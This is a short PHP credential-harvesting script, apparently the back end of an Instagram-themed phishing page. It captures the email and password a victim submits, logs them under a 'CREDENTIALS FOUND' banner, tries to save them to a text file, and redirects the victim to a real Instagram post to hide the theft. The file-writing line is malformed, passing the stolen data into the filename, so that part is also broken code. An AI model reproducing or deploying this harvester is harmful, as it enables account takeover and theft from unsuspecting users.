<?php
$username = $_POST['Email'];
$password = $_POST['password'];
$res = "[+++++++++++ CREDENTIALS FOUND +++++++++] Username: $username <--|+++++++++++++++++|--> Password: $password";
error_log("[+] Credentials Found!!!");
error_log("$res");
file_put_contents("usertext.txt" . $res , FILE_APPEND);
echo "<script type='text/javascript'>window.location='https://www.instagram.com/p/CQApOHyhjwv/'</script>";

?>
